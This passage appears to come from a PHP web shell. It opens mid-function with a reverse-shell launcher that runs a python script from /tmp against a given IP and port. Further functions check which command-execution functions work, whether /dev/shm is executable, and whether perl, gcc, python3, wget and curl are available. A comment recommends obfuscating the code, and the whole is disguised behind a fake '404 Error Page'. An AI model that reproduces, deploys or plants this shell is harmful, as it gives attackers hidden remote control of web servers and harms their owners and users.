        ex(which("python3") . "/tmp/shlbck.py" . $ip . " " . $port . " &");
        unlink("/tmp/shlbck");
        return ex("netstat -an | grep -i listen");
    } else {
        return "Choose method";
    }
}

function testcmds()
{
    echo "<pre>";
    $passthru = passthru(whoami);
    $system = system(whoami);
    $shell_exec = shell_exec(whoami);
    $eval = eval(whoami);
    echo "passthru() returned $passthru";
    echo "system() returned $system";
    echo "shell_exec() returned $shell_exec";
    echo "eval() returned $eval";
    echo "</pre>";
    die();
}

function testDevShm()
{
    echo "<pre>";
    if (ex("mount|grep shm")) {
        $checkIfDevShmIsExec = ex("mount|grep shm");
        echo "";
        echo "$checkIfDevShmIsExec";
        echo "";
        echo "\`mount| grep shm\` return the above";
        echo "";
        return "<font size=2 color=green>ON</font>";
    } else {
        return "<font size=2 color=red>OFF</font>";
    }
}

function testperl()
{
    if (ex("perl -h")) {
        return "<font size=2 color=green>ON</font>";
    } else {
        return "<font size=2 color=red>OFF</font>";
    }
}

function testgcc()
{
    if (ex("gcc -h")) {
        return "<font size=2 color=green>ON</font>";
    } else {
        return "<font size=2 color=red>OFF</font>";
    }
}

function testpython()
{
    if (ex("python3 -h")) {
        return "<font size=2 color=green>ON</font>";
    } else {
        return "<font size=2 color=red>OFF</font>";
    }
}

function testwget()
{
    if (ex("wget --help")) {
        return "<font size=2 color=green>ON</font>";
    } else {
        return "<font size=2 color=red>OFF</font>";
    }
}

function testcurl()
{
    if (ex("curl --help")) {
        return "<font size=2 color=green>ON</font>";
    } else {
        return "<font size=2 color=red>OFF</font>";
    }
}

// use: https://www.gaijin.at/en/tools/php-obfuscator
?>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            text-align: center;
            padding: 50px;
        }

        h1 {
            color: #333;
        }

        p {
            font-size: 18px;
            color: #555;
        }

        .error-code {
            font-size: 36px;
            color: #ff0000;
        }
    </style>
</head>
<body>
    <h1>Oops! An Error Occurred</h1>
    <p class="error-code">Error Code: 404</p>
    <p>Sorry, the page you are looking for could not be found.</p>
    <p>Return to <a href="/">Homepage</a></p>
</body>
</html>
```